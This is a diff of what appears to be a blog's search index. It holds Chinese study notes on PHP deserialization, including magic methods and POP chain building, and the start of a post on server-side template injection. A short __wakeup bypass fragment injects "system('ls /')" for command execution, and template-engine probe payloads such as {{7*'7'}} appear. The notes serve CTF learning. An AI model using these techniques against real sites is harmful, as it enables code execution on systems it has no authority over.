@@ -500,6 +500,348 @@ plt.show()</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>PHP反序列化</title>
+    <url>/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h1><h2 id="入门之前"><a href="#入门之前" class="headerlink" title="入门之前"></a>入门之前</h2><p>首先要知道PHP是一门面向对象的语言</p>
+<p>所以会碰到类，对象之类的概念</p>
+<p>稍微补充一点罢，不然会听不懂的()</p>
+<ul>
+<li><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</li>
+<li><strong>对象</strong> − 是类的实例。</li>
+<li><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的<strong>属性</strong>。</li>
+<li><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</li>
+<li><strong>继承</strong> − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li>
+<li><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</li>
+<li><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</li>
+<li><strong>多态</strong> − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</li>
+<li><strong>重载</strong> − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</li>
+<li><strong>抽象性</strong> − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li>
+<li><strong>封装</strong> − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li>
+<li><strong>构造函数</strong> − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</li>
+<li><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</li>
+</ul>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;<span class="comment">//类</span>
+  <span class="comment">/* 成员变量 */</span>
+  <span class="keyword">var</span> <span class="variable">$url</span>;
+  <span class="keyword">var</span> <span class="variable">$title</span>;
+  
+  <span class="comment">/* 成员函数 */</span>
+  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
+     <span class="variable language_">$this</span>-&gt;url = <span class="variable">$par</span>;
+  &#125;
+  
+  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;
+     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;url . PHP_EOL;
+  &#125;
+  
+  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
+     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;
+  &#125;
+  
+  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;
+     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;title . PHP_EOL;
+  &#125;
+&#125;
+<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Site</span>();<span class="comment">//创建对象</span>
+<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&#x27;AyaN0&#x27;</span>);<span class="comment">//调用成员方法</span>
+<span class="comment">//或者$a-&gt;setTitle=&#x27;AyaN0&#x27;;</span>
+
+<span class="meta">?&gt;</span></code></pre>
+
+<h2 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h2><h3 id="construct-和-destruct"><a href="#construct-和-destruct" class="headerlink" title="__construct() 和 __destruct()"></a><code>__construct()</code> 和 <code>__destruct()</code></h3><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p>
+<pre><code class="highlight plaintext">__destruct()`：当对象被销毁时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用`__construct`后一定会调用`__destruct`；或者我们直接传入一个对象，它后面被销毁时也会调用`__destruct</code></pre>
+
+<p>可以看到，创建对象e时调用了<code>__construct</code>，然后输出序列化后的对象<code>t</code>，最后在销毁对象<code>t</code>时调用了<code>__destruct</code></p>
+<ul>
+<li><p>实例</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+
+    <span class="keyword">public</span> <span class="variable">$username</span>;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
+        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;
+    &#125;
+
+&#125;
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);
+<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
+<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
+<span class="meta">?&gt;</span>
+<span class="comment">//__construct test</span></code></pre>
+
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;
+    &#125;
+
+&#125;
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
+<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
+<span class="meta">?&gt;</span>
+<span class="comment">//__destruct test</span>
+<span class="comment">//__destruct test</span></code></pre></li>
+</ul>
+<h3 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep() 和 __wakeup()"></a><code>__sleep()</code> 和 <code>__wakeup()</code></h3><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p>
+<p><code>__wakeup()</code>: 将在<strong>字符串被反序列化之后被立即调用</strong>，就是说<strong>看到</strong><code>unserialize</code><strong>后就会被立即调用</strong></p>
+<p>在看到<code>serialize($b)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p>
+<p>直接输入了<strong>字符串</strong>，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;
+
+    <span class="keyword">public</span> <span class="variable">$username</span>;
+    <span class="keyword">public</span> <span class="variable">$nickname</span>;
+    <span class="keyword">private</span> <span class="variable">$password</span>;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
+        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
+        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
+    &#125;
+
+    <span class="comment">// 重载序列化调用的方法</span>
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span>
+        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);
+    &#125;
+
+&#125;
+<span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);
+<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);
+<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;结果就是过滤掉了password的值</span></code></pre>
+
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;
+
+    <span class="keyword">public</span> <span class="variable">$username</span>;
+    <span class="keyword">public</span> <span class="variable">$nickname</span>;
+    <span class="keyword">private</span> <span class="variable">$password</span>;
+    <span class="keyword">private</span> <span class="variable">$order</span>;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
+        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
+        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
+    &#125;
+
+    <span class="comment">// 定义反序列化后调用的方法</span>
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;
+    &#125;
+&#125;
+<span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;
+<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));
+<span class="comment">/*</span>
+<span class="comment">class User#1 (4) &#123;</span>
+<span class="comment">  public $username =&gt;</span>
+<span class="comment">  string(1) &quot;a&quot;</span>
+<span class="comment">  public $nickname =&gt;</span>
+<span class="comment">  string(1) &quot;b&quot;</span>
+<span class="comment">  private $password =&gt;</span>
+<span class="comment">  string(1) &quot;a&quot;</span>
+<span class="comment">  private $order =&gt;</span>
+<span class="comment">  NULL</span>
+<span class="comment">&#125;</span>
+<span class="comment">上面wakeup的函数作用是将username的变量值赋值给password变量。*/</span></code></pre>
+
+
+
+<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h3><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p>
+<ol>
+<li><code>echo($obj)</code>或<code>print($obj)</code><strong>打印对象</strong>时会触发</li>
+<li><strong>反序列化对象</strong>与字符串连接时</li>
+<li><strong>反序列化对象</strong>参与格式化字符串时</li>
+<li><strong>反序列化对象</strong>与<strong>字符串</strong>进行<code>preg_match</code>正则匹配)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li>
+<li><strong>反序列化对象</strong>参与<strong>格式化sql语句</strong>时，绑定参数时(用的少)</li>
+<li><strong>反序列化对象</strong>经过<strong>php字符串函数</strong>时，如<code>strlen()</code>，<code>addslashes()</code>时(用的少)</li>
+<li>在<code>in_array()</code>方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有<code>tostring</code>返回的字符串的时候<code>tostring</code>会被调用</li>
+<li><strong>反序列化对象</strong>作为<code>class_exists()</code>的参数的时候(用的少)</li>
+</ol>
+<p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用</p>
+<p>新建了对象<code>t</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>
+<span class="function">    </span>&#123;
+       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;
+    &#125;
+
+&#125;
+
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="keyword">echo</span> <span class="variable">$test</span>;
+<span class="comment">//__toString</span></code></pre>
+
+
+
+<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h3><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p>
+<p>需要注意的是，这个魔术方法只在<strong>PHP 5.3.0 及以上版本</strong>有效</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>
+<span class="function">    </span>&#123;
+       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;
+    &#125;
+
+&#125;
+
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="variable">$test</span>();
+<span class="comment">//__invoke test</span></code></pre>
+
+
+
+<h3 id="get-和-set"><a href="#get-和-set" class="headerlink" title="__get() 和 __set()"></a><code>__get()</code> 和 <code>__set()</code></h3><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取值，或者说是<strong>调用一个类及其父类方法中未定义属性时</strong>，需要一个参数，代表不存在的属性值</p>
+<p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private</code> <code>protected</code>)(用的不多)</p>
+<p><code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>t</code>属性，但我们是没有定义<code>t</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值打印出来</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$var1</span>;
+    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
+    &#125;
+
+&#125;
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="variable">$test</span>-&gt;var2;
+<span class="meta">?&gt;</span>
+    <span class="comment">//var2</span></code></pre>
+
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$var1</span>;
+    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;
+    &#125;
+
+&#125;
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;
+<span class="meta">?&gt;</span></code></pre>
+
+
+
+<h3 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a><code>__call()</code> 和 <code>__callStatic()</code></h3><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p>
+<p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p>
+<p>比如说像这段代码，我们调用对象<code>t</code>中的方法<code>t2</code>，但因为类中没有方法<code>t2</code>，所以说就调用了<code>__call()</code></p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
+    &#125;
+
+&#125;
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
+<span class="meta">?&gt;</span>
+<span class="comment">//callxxx,a</span></code></pre>
+
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+
+    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
+    &#125;
+
+&#125;
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
+<span class="meta">?&gt;</span>
+<span class="comment">//callxxx,a</span></code></pre>
+
+<p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 self，parent 和 static）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p>
+<h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a><code>__clone()</code></h3><p><code>__clone()</code>:当使用clone关键字拷贝完成一个对象后，新对象就会调用定义的魔术方法(如果存在)</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;
+    &#125;
+
+&#125;
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);
+<span class="meta">?&gt;</span>
+<span class="comment">//__clone test</span></code></pre>
+
+
+
+<h3 id="isset-和-unset"><a href="#isset-和-unset" class="headerlink" title="__isset()和__unset"></a><code>__isset()</code>和<code>__unset</code></h3><p><code>__isset()</code>:对不可访问属性调用<code>isset()</code>或者<code>empty()</code>时，<code>__isset()</code>会被调用</p>
+<p><code>__unset()</code>:对不可访问属性调用<code>unset()</code>时，<code>__unset()</code>会被触发</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+    <span class="keyword">private</span> <span class="variable">$var</span>;
+    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
+    &#125;
+
+&#125;
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);
+<span class="meta">?&gt;</span>
+    <span class="comment">//var1</span></code></pre>
+
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
+    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
+    &#125;
+
+&#125;
+<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
+<span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);
+<span class="meta">?&gt;</span>
+    <span class="comment">//var1</span></code></pre>
+
+
+
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过 __wakeup:"></a>绕过 __wakeup:</h3><ul>
+<li>PHP5 &lt; 5.6.25</li>
+<li>PHP7 &lt; 7.0.10</li>
+</ul>
+<p>当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __wakeup()</p>
+<p>&#x2F;&#x2F;详见[SWPUCTF 2021 新生赛]no_wakeup</p>
+<p>当然，也可以通过赋值来绕过__wake下面将执行的字符串置空的情况</p>
+<p>使另一个构造好的变量和被控制的变量公用一个内存如</p>
+<pre><code class="highlight plaintext">$t-&gt;c=&quot;system(&#x27;ls /&#x27;);&quot;;
+$t-&gt;b=&amp;$t-&gt;a;
+//a未被wakeup置空的变量，执行的也是a,前面还有一个c-&gt;b的过程</code></pre>
+
+
+
+<h3 id="绕过-O"><a href="#绕过-O" class="headerlink" title="绕过 O"></a>绕过 O</h3><p>有时会对构造的payload进行正则匹配</p>
+<p>此时需要绕过一些必须绕过的关键词，如O</p>
+<p>gc机制</p>
+<h2 id="构链经验"><a href="#构链经验" class="headerlink" title="构链经验:"></a>构链经验:</h2><p>首先，找到注入点，注入点一般 被包裹在最内部(因为第一个执行，通过各种魔术方法将结果成功传输到外部并成功销毁对象)，接着内层的魔术方法要在紧邻的外层得到触发，(也就是为什么他被称为pop链的缘故)，最后成功销毁就算pop链构造成功了</p>
+<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2>]]></content>
+      <tags>
+        <tag>-web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTML学习以及网页搭建初实践</title>
     <url>/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/</url>
     <content><![CDATA[<h1 id="HTML学习以及网页搭建初实践"><a href="#HTML学习以及网页搭建初实践" class="headerlink" title="HTML学习以及网页搭建初实践"></a>HTML学习以及网页搭建初实践</h1><p>学XSS一大家子时发现前端不仔细了解一下学习很难进行下去啊，于是就想先简单学习一下html来做一个铺垫</p>
@@ -1387,345 +1729,398 @@ plt.show()</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>PHP反序列化</title>
-    <url>/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<h1 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h1><h2 id="入门之前"><a href="#入门之前" class="headerlink" title="入门之前"></a>入门之前</h2><p>首先要知道PHP是一门面向对象的语言</p>
-<p>所以会碰到类，对象之类的概念</p>
-<p>稍微补充一点罢，不然会听不懂的()</p>
+    <title>SSTI漏洞</title>
+    <url>/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="SSTI-模板注入-漏洞"><a href="#SSTI-模板注入-漏洞" class="headerlink" title="SSTI(模板注入)漏洞"></a>SSTI(模板注入)漏洞</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
+<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
+<h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
+<p>当前使用的一些框架，比如python的<code>flask</code>，php的<code>tp</code>，java的<code>spring</code>等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
+<p>漏洞成因就是服务端接收了用户的恶意输入(一般来说是用户输入的变量)以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
+<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
+<h2 id="确定漏洞"><a href="#确定漏洞" class="headerlink" title="确定漏洞"></a>确定漏洞</h2><p>贴个图</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti.png" alt="ssti"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti2.png" alt="ssti2"></p>
+<h3 id="第一层："><a href="#第一层：" class="headerlink" title="第一层："></a>第一层：</h3><ul>
+<li>如果可以执行${7*7}的结果，那我们进入第二层的<code>a&#123;*comment*&#125;b</code>，如果没用执行结果，那就进入第二层的<code>&#123;&#123;7*7&#125;&#125;</code></li>
+<li>在Mako模板引擎中我们也是${}形式的</li>
+</ul>
+<h3 id="第二层："><a href="#第二层：" class="headerlink" title="第二层："></a>第二层：</h3><ul>
+<li>在<code>a&#123;*comment*&#125;b</code>中，如果{**}被当作注释而输出ab，我们就可以确定这个地方是Smarty模板，如果不能，进入第三层；</li>
+<li>在<code>&#123;&#123;7*7&#125;&#125;</code>中，如果能够执行，那我们进入第三层。</li>
+</ul>
+<h3 id="第三层："><a href="#第三层：" class="headerlink" title="第三层："></a>第三层：</h3><ul>
+<li>当49的结果为49时，对应着Twig模板类型，而结果如果为7777777，则对应着Jinja2的模板类型</li>
+<li>当能够执行<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>,我们就能确定是Mako模板，能够直接执行python命令.</li>
+</ul>
+<p>接下来就进入不同模板的不同注入方式</p>
+<h2 id="Python模板注入"><a href="#Python模板注入" class="headerlink" title="Python模板注入"></a>Python模板注入</h2><h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><p>python的一种主流模板，基本你看到页面在输入后会实时回显在页面并且发包后看出语言是python基本就能确认是</p>
+<pre><code class="highlight plaintext">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 7777777 -&gt; jinjia2</code></pre>
+
+<p>这里先简单介绍一下jinja2的语法好了</p>
+<h4 id="语法结构"><a href="#语法结构" class="headerlink" title="语法结构"></a>语法结构</h4><p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取</p>
+<p>Jinja2 模板同样支持控制语句，像在 <code>&#123;%…%&#125; </code>块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子:</p>
+<p><code>&lt;ul&gt;     &#123;% for comment in comments %&#125;
+         <li>&#123;&#123;comment&#125;&#125;</li>
+    &#123;% endfor %&#125;&lt;ul&gt;</code></p>
+<p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值</p>
+<pre><code class="highlight html">Hello, &#123;&#123;name|capitalize&#125;&#125;</code></pre>
+
+<p>但是这只能在渲染前的模板中进行注入，如果模板已经渲染，就不存在模板注入了:</p>
